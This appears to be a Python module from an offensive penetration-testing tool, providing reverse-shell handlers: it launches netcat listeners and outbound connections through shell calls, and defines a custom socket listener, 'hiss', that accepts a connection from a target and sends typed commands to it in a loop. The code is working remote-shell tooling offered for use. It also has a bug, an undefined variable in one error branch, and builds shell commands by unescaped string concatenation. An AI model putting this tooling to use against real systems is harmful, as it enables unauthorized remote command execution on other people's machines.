# Copyright 2023 2xdropout

import SNEKactions
import socket
import sys
import time
from termcolor import colored
from os import system


def launch_listener():
    listenerType = SNEKactions.get_var('listener')
    port = str(SNEKactions.get_var('attackPort'))

    if listenerType in ['nc', 'ncat']:
        system(str(listenerType) + ' -lvnp ' + port)
    elif listenerType in ['hiss', 'HISS']:
        hiss()
    else:
        errorText = 'ERROR ', listenerType, ' is not a valid listner!'
        print(colored(errorText,'red'))


def launch_connecter(port):
    connectorType = SNEKactions.get_var('listener')
    
    if connectorType in ['nc', 'ncat']:
        system(str(connectorType) + " " + str(SNEKactions.get_var('target')) + " " + str(port))
    else:
        errorText = 'ERROR ', listenerType, ' is not a valid listner!'
        print(colored(errorText,'red'))


def hiss():


    def connect(ip, port):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.bind((ip,port))
        s.listen(1)
        conn, addr = s.accept()
        while True:
            #Receive data from the target and get user input
            ans = conn.recv(1024).decode()
            sys.stdout.write(ans)
            command = input()

            #Send command
            command += "\n"
            conn.send(command.encode())
            time.sleep(1)
    

    if SNEKactions.get_var('attackerIP') is None or SNEKactions.get_var('attackPort') is None:
        print('Missing variables!')
        return

    connect(SNEKactions.get_var('attackerIP'),int(SNEKactions.get_var('attackPort')))


    
